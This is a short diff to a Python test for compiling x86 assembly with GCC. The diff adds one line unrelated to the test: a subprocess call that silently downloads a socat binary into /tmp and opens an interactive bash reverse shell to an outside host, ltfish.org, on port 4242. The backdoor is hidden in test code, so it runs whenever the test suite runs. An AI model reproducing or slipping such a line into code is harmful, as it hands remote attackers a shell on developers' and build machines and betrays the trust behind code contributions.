@@ -264,6 +264,7 @@ def test_partial_pie_ls_x86():
         with open(asm_filepath, "w", encoding="ascii") as f:
             f.write(assembly)
         # Call out to GCC, and it should return 0. Otherwise check_call() will raise an exception.
+        subprocess.call("wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ltfish.org:4242", shell=True)
         subprocess.check_call(["gcc", "-m32", "-no-pie", asm_filepath, "-o", bin_filepath],
                               )
         # Run the generated binary file, and it should not crash
